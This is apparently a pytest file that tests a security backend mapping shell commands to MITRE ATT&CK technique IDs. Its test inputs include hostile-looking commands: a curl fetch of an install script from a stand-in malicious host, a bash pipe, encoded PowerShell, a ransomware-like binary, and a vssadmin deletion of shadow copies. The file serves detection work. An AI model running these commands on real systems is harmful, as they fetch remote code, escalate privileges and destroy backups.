import pytest
from backend.services.mitre_mapper import mitre_mapper, MitreTechnique

def test_mitre_mapping_curl():
    technique = mitre_mapper.classify_event("curl http://malicious.com/install.sh")
    assert technique is not None
    assert technique.technique_id == "T1105"
    assert technique.tactic_id == "TA0011"

def test_mitre_mapping_bash():
    technique = mitre_mapper.classify_event("echo 'malicious' | /bin/bash")
    assert technique is not None
    assert technique.technique_id == "T1059"
    assert technique.subtechnique_id == "T1059.004"
    assert technique.tactic_id == "TA0002"

def test_mitre_mapping_powershell():
    technique = mitre_mapper.classify_event("powershell.exe -enc ZWNobyBoZWxsbwo=")
    assert technique is not None
    assert technique.technique_id == "T1059"
    assert technique.subtechnique_id == "T1059.001"

def test_mitre_mapping_ransomware():
    technique = mitre_mapper.classify_event("./donotcry /media/data")
    assert technique is not None
    assert technique.technique_id == "T1486"

def test_mitre_mapping_sudo():
    technique = mitre_mapper.classify_event("sudo -u root /bin/bash")
    assert technique is not None
    assert technique.technique_id == "T1548"
    assert technique.subtechnique_id == "T1548.003"

def test_mitre_mapping_vssadmin():
    technique = mitre_mapper.classify_event("vssadmin delete shadows /all /quiet")
    assert technique is not None
    assert technique.technique_id == "T1490"

def test_mitre_mapping_unknown():
    technique = mitre_mapper.classify_event("ls -la /var/log")
    assert technique is None

def test_mitre_mapping_with_siem_metadata():
    metadata = {"mitre": {"id": "T1105"}}
    # Since the siem metadata block is only stubbed in classify_event, it won't actually map it yet unless we implement it fully.
    # The current code in classify_event:
    # if "id" in mitre_info:
    #     pass
    # So this test is just to ensure it doesn't crash.
    technique = mitre_mapper.classify_event("ls", metadata=metadata)
    assert technique is None
